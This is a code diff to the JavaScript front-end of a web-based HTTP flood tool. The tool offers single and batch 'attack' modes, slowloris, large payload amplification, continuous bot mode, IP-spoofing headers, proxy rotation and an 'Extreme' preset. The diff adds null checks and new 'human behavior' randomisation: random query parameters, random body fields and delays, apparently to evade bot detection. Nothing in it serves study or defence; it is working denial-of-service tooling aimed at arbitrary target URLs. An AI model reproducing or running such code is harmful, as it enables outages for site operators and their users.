@@ -56,14 +56,16 @@ let amplificationEnabled = false;
 let amplificationKB = 500;
 let amplificationType = 'normal';
 
-amplifyToggle.addEventListener('change', () => {
-  amplificationEnabled = amplifyToggle.checked;
-  amplifyControls.style.display = amplificationEnabled ? 'block' : 'none';
-});
+if (amplifyToggle) {
+  amplifyToggle.addEventListener('change', () => {
+    amplificationEnabled = amplifyToggle.checked;
+    if (amplifyControls) amplifyControls.style.display = amplificationEnabled ? 'block' : 'none';
+  });
+}
 if (amplifyKb) {
   amplifyKb.addEventListener('input', () => {
     amplificationKB = parseFloat(amplifyKb.value);
-    amplifyValue.innerText = amplificationKB + ' KB';
+    if (amplifyValue) amplifyValue.innerText = amplificationKB + ' KB';
   });
 }
 if (amplifyType) {
@@ -72,15 +74,17 @@ if (amplifyType) {
   });
 }
 
-// Continuous Mode
+// Continuous Mode (Bot)
 const continuousToggle = document.getElementById('continuousToggle');
 const continuousControls = document.getElementById('continuousControls');
 let continuousMode = false;
 let intervalMs = 5000;
-continuousToggle.addEventListener('change', () => {
-  continuousMode = continuousToggle.checked;
-  continuousControls.style.display = continuousMode ? 'block' : 'none';
-});
+if (continuousToggle) {
+  continuousToggle.addEventListener('change', () => {
+    continuousMode = continuousToggle.checked;
+    if (continuousControls) continuousControls.style.display = continuousMode ? 'block' : 'none';
+  });
+}
 const intervalInput = document.getElementById('intervalMs');
 if (intervalInput) {
   intervalInput.addEventListener('change', () => {
@@ -88,7 +92,7 @@ if (intervalInput) {
   });
 }
 
-// Reset extreme
+// Reset Extreme
 const resetExtremeBtn = document.getElementById('resetExtremeBtn');
 if (resetExtremeBtn) {
   resetExtremeBtn.addEventListener('click', () => {
@@ -98,11 +102,11 @@ if (resetExtremeBtn) {
     retryInput.value = 0;
     randomDelayInput.value = 0;
     attackTypeSelect.value = 'slowloris';
-    amplifyToggle.checked = true;
-    amplifyToggle.dispatchEvent(new Event('change'));
-    amplifyKb.value = 500;
-    amplifyKb.dispatchEvent(new Event('input'));
-    amplifyType.value = 'normal';
+    if (amplifyToggle) amplifyToggle.checked = true;
+    if (amplifyToggle) amplifyToggle.dispatchEvent(new Event('change'));
+    if (amplifyKb) amplifyKb.value = 500;
+    if (amplifyKb) amplifyKb.dispatchEvent(new Event('input'));
+    if (amplifyType) amplifyType.value = 'normal';
     forceSuccessCheck.checked = true;
     randomHeadersCheck.checked = true;
     keepAliveCheck.checked = true;
@@ -110,13 +114,12 @@ if (resetExtremeBtn) {
     spoofRealIp.checked = true;
     spoofCfConnecting.checked = true;
     spoofRange.checked = true;
-    continuousToggle.checked = false;
-    continuousToggle.dispatchEvent(new Event('change'));
+    if (continuousToggle) continuousToggle.checked = false;
+    if (continuousToggle) continuousToggle.dispatchEvent(new Event('change'));
     addLog("⚙️ Reset to Extreme: 200 conc, 500KB amp, slowloris");
   });
 }
 
-// Chart & state
 let chart;
 let abortController = null;
 let isRunning = false;
@@ -135,7 +138,7 @@ function updateTrafficEstimator() {
   if (lastTrafficUpdate !== 0 && now - lastTrafficUpdate >= 1000) {
     const deltaBytes = stats.totalBytes - lastTotalBytes;
     const mbps = (deltaBytes * 8) / 1e6;
-    trafficMbpsSpan.innerText = mbps.toFixed(2);
+    if (trafficMbpsSpan) trafficMbpsSpan.innerText = mbps.toFixed(2);
     lastTotalBytes = stats.totalBytes;
     lastTrafficUpdate = now;
   } else if (lastTrafficUpdate === 0) {
@@ -155,26 +158,26 @@ function addLog(msg, isError = false) {
 }
 
 function updateUI() {
-  successSpan.innerText = stats.success;
-  failSpan.innerText = stats.fail;
+  if (successSpan) successSpan.innerText = stats.success;
+  if (failSpan) failSpan.innerText = stats.fail;
   const done = stats.success + stats.fail;
   const errorRate = done === 0 ? 0 : (stats.fail / done * 100).toFixed(1);
-  errorRateSpan.innerText = errorRate + '%';
-  totalBytesSpan.innerText = (stats.totalBytes / 1024).toFixed(1);
+  if (errorRateSpan) errorRateSpan.innerText = errorRate + '%';
+  if (totalBytesSpan) totalBytesSpan.innerText = (stats.totalBytes / 1024).toFixed(1);
   if (stats.times.length) {
     const avg = stats.times.reduce((a,b)=>a+b,0)/stats.times.length;
-    avgSpan.innerText = avg.toFixed(1);
-  } else avgSpan.innerText = "0";
+    if (avgSpan) avgSpan.innerText = avg.toFixed(1);
+  } else if (avgSpan) avgSpan.innerText = "0";
   if (stats.startTime && isRunning) {
     const elapsed = (Date.now() - stats.startTime) / 1000;
-    if (elapsed > 0) rpsSpan.innerText = (done / elapsed).toFixed(1);
-  } else if (stats.startTime) {
+    if (elapsed > 0 && rpsSpan) rpsSpan.innerText = (done / elapsed).toFixed(1);
+  } else if (stats.startTime && rpsSpan) {
     const elapsed = (Date.now() - stats.startTime) / 1000;
     if (elapsed > 0) rpsSpan.innerText = (stats.times.length / elapsed).toFixed(1);
   }
   const percent = (done / stats.total) * 100;
-  progressBar.style.width = `${percent}%`;
-  progressText.innerText = `${done}/${stats.total}`;
+  if (progressBar) progressBar.style.width = `${percent}%`;
+  if (progressText) progressText.innerText = `${done}/${stats.total}`;
   updateTrafficEstimator();
 }
 
@@ -197,6 +200,7 @@ function resetStats() {
   updateUI();
 }
 
+// Random helpers
 function randomIP(prefix) { return prefix + Math.floor(Math.random() * 255); }
 function randomRange() { const s = Math.floor(Math.random()*1000); return `bytes=${s}-${s+Math.floor(Math.random()*500)}`; }
 function randomAcceptLanguage() { const langs = ['en-US,en;q=0.9','id-ID,id;q=0.9','de-DE,de;q=0.8','ja-JP,ja;q=0.8']; return langs[Math.floor(Math.random()*langs.length)]; }
@@ -232,7 +236,7 @@ if (autoPayloadSelect) {
   autoPayloadSelect.addEventListener('change', () => { if(autoPayloadSelect.value) payload.value = generatePayload(autoPayloadSelect.value); });
 }
 
-// ======================== SINGLE ATTACK (via /api/attack) ========================
+// ======================== SINGLE ATTACK ========================
 async function sendSingleRequest(url, method, body, timeout, retryCount, randomDelay, keepAlive, attackType) {
   let headers = {};
   if (randomHeadersCheck.checked) {
@@ -257,6 +261,18 @@ async function sendSingleRequest(url, method, body, timeout, retryCount, randomD
   if (attackType === 'slowloris') headers["Connection"] = "keep-alive";
   const proxyArray = proxyListText.value ? proxyListText.value.split('\n').filter(p=>p.trim()) : [];
 
+  // Human behavior: add random query parameter to URL
+  let finalUrl = url;
+  const rnd = Math.random().toString(36).substring(2, 8);
+  finalUrl += (finalUrl.includes('?') ? '&' : '?') + `_rnd=${rnd}`;
+
+  // Randomize body field if POST/PUT (only if not empty)
+  let finalBody = body;
+  if ((method.toUpperCase() === 'POST' || method.toUpperCase() === 'PUT') && finalBody && finalBody.trim()) {
+    const rndField = `_human=${Math.floor(Math.random()*10000)}`;
+    finalBody += (finalBody.includes('&') ? '&' : (finalBody.trim().startsWith('{') ? ',' : '&')) + rndField;
+  }
+
   const controller = new AbortController();
   const tid = setTimeout(() => controller.abort(), timeout);
   const start = performance.now();
@@ -265,7 +281,7 @@ async function sendSingleRequest(url, method, body, timeout, retryCount, randomD
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        url, method, headers, body: body || "",
+        url: finalUrl, method, headers, body: finalBody || "",
         timeout, retryCount, randomDelay,
         keepAlive, attackType,
         amplifyKB: amplificationEnabled ? amplificationKB : 0,
@@ -361,7 +377,7 @@ async function startSingleAttack() {
     }
     let preview = `HTTP ${statusCode || '??'} | ${duration.toFixed(0)}ms`;
     if (responseBody) preview += `\nBody: ${responseBody.substring(0, 200)}`;
-    rawResponsePreview.innerText = preview;
+    if (rawResponsePreview) rawResponsePreview.innerText = preview;
     updateUI();
   };
   try {
@@ -379,7 +395,7 @@ async function startSingleAttack() {
   }
 }
 
-// ======================== BATCH ATTACK (via /api/batch) ========================
+// ======================== BATCH ATTACK (dengan perilaku manusia) ========================
 async function startBatchAttack() {
   if (isRunning) { addLog("Attack already running! Stop it first.", true); return; }
   let url = targetUrl.value.trim();
@@ -394,7 +410,9 @@ async function startBatchAttack() {
   if (autoType && autoType !== "") body = generatePayload(autoType);
   const timeout = parseInt(timeoutInput.value);
   const retryCount = parseInt(retryInput.value);
-  const randomDelay = parseInt(randomDelayInput.value);
+  let randomDelay = parseInt(randomDelayInput.value);
+  // Untuk perilaku manusia, kita tambahkan random delay minimal 50ms jika tidak diatur
+  if (randomDelay === 0) randomDelay = 50;
   const keepAlive = keepAliveCheck.checked;
   let attackType = attackTypeSelect.value;
   let customHeadersObj = parseCustomHeaders(customHeaders.value);
@@ -420,7 +438,7 @@ async function startBatchAttack() {
   if (cookieHeader) finalHeaders["Cookie"] = cookieHeader;
   if (attackType === 'slowloris') finalHeaders["Connection"] = "keep-alive";
 
-  addLog(`💀 BATCH ATTACK | ${mtd} ${url} | Total:${total} | Workers:${concurrency} | Continuous:${continuousMode} | Amp:${amplificationEnabled?amplificationKB+"KB":"OFF"}`);
+  addLog(`💀 BATCH ATTACK | ${mtd} ${url} | Total:${total} | Workers:${concurrency} | Continuous:${continuousMode} | Amp:${amplificationEnabled?amplificationKB+"KB":"OFF"} | Human delay:${randomDelay}ms`);
   startBtn.disabled = true;
   batchBtn.disabled = true;
   stopBtn.disabled = false;
@@ -454,7 +472,7 @@ async function startBatchAttack() {
       stats.times = data.latencies || [];
       updateUI();
       addLog(`✅ BATCH FINISHED | Success:${data.successCount} Fail:${data.failCount} | RPS:${data.rps} | Loops:${data.loopCount||1} | Time:${(data.totalTimeMs/1000).toFixed(2)}s`);
-      rawResponsePreview.innerText = `Batch completed: ${data.successCount}/${data.totalRequests} success`;
+      if (rawResponsePreview) rawResponsePreview.innerText = `Batch completed: ${data.successCount}/${data.totalRequests} success`;
     } else {
       addLog(`Batch error: ${data.error}`, true);
     }
@@ -493,43 +511,43 @@ async function checkTargetHealth(url) {
     const start = performance.now();
     await fetch(url, { method: 'HEAD', mode: 'no-cors', cache: 'no-cache' });
     const duration = performance.now() - start;
-    responseTimeText.innerText = `⚡ ${duration.toFixed(0)} ms`;
-    healthIndicator.className = 'health-online w-3 h-3 rounded-full';
-    healthText.innerText = 'Online';
+    if (responseTimeText) responseTimeText.innerText = `⚡ ${duration.toFixed(0)} ms`;
+    if (healthIndicator) healthIndicator.className = 'health-online w-3 h-3 rounded-full';
+    if (healthText) healthText.innerText = 'Online';
   } catch(e) {
-    healthIndicator.className = 'health-offline w-3 h-3 rounded-full';
-    healthText.innerText = 'Offline';
-    responseTimeText.innerText = '';
+    if (healthIndicator) healthIndicator.className = 'health-offline w-3 h-3 rounded-full';
+    if (healthText) healthText.innerText = 'Offline';
+    if (responseTimeText) responseTimeText.innerText = '';
   }
 }
 function updatePreview(url) {
   let pu = url; if (!pu.startsWith('http')) pu = 'https://' + pu;
-  targetFrame.srcdoc = `<html><body style="background:#111;color:#fff;display:flex;align-items:center;justify-content:center;height:100%"><a href="${pu}" target="_blank">Open in new tab</a></body></html>`;
+  if (targetFrame) targetFrame.srcdoc = `<html><body style="background:#111;color:#fff;display:flex;align-items:center;justify-content:center;height:100%"><a href="${pu}" target="_blank">Open in new tab</a></body></html>`;
 }
 if (refreshPreviewBtn) {
   refreshPreviewBtn.onclick = () => { let u = targetUrl.value.trim(); if(u) updatePreview(u); checkTargetHealth(u); };
 }
 function startHealthCheck() { if(healthCheckInterval) clearInterval(healthCheckInterval); healthCheckInterval = setInterval(() => { let u = targetUrl.value.trim(); if(u) checkTargetHealth(u); }, 5000); }
-async function updateActiveUsers() { try { const res = await fetch('/api/heartbeat'); const data = await res.json(); activeUsersSpan.innerText = data.active; } catch(e) {} }
+async function updateActiveUsers() { try { const res = await fetch('/api/heartbeat'); const data = await res.json(); if (activeUsersSpan) activeUsersSpan.innerText = data.active; } catch(e) {} }
 function startHeartbeat() { heartbeatInterval = setInterval(updateActiveUsers, 30000); updateActiveUsers(); }
 
 window.onload = () => {
-  const ctx = rtChartCanvas.getContext('2d');
-  chart = new Chart(ctx, {
-    type: 'line',
-    data: { labels: Array(30).fill(''), datasets: [{ label: 'Response (ms)', data: [], borderColor: '#ff4444', backgroundColor: '#ff000033', tension: 0.2, fill: true, pointRadius: 1 }] },
-    options: { responsive: true, maintainAspectRatio: true, scales: { y: { title: { display: true, text: 'ms' } } } }
-  });
-  startBtn.onclick = startSingleAttack;
-  batchBtn.onclick = startBatchAttack;
-  stopBtn.onclick = stopAttack;
-  exportBtn.onclick = exportCSV;
+  const ctx = rtChartCanvas?.getContext('2d');
+  if (ctx) {
+    chart = new Chart(ctx, {
+      type: 'line',
+      data: { labels: Array(30).fill(''), datasets: [{ label: 'Response (ms)', data: [], borderColor: '#ff4444', backgroundColor: '#ff000033', tension: 0.2, fill: true, pointRadius: 1 }] },
+      options: { responsive: true, maintainAspectRatio: true, scales: { y: { title: { display: true, text: 'ms' } } } }
+    });
+  }
+  if (startBtn) startBtn.onclick = startSingleAttack;
+  if (batchBtn) batchBtn.onclick = startBatchAttack;
+  if (stopBtn) stopBtn.onclick = stopAttack;
+  if (exportBtn) exportBtn.onclick = exportCSV;
   fetch('/api/status').then(r=>r.json()).then(d=>addLog(`Backend: ${d.message}`)).catch(()=>addLog("Backend OK"));
-  let u = targetUrl.value.trim(); if(u) updatePreview(u);
+  let u = targetUrl?.value.trim(); if(u) updatePreview(u);
   startHealthCheck();
   startHeartbeat();
-  // inisialisasi
-  amplifyToggle.dispatchEvent(new Event('change'));
-  continuousToggle.dispatchEvent(new Event('change'));
+  if (amplifyToggle) amplifyToggle.dispatchEvent(new Event('change'));
   if (amplifyKb) amplifyKb.dispatchEvent(new Event('input'));
 };
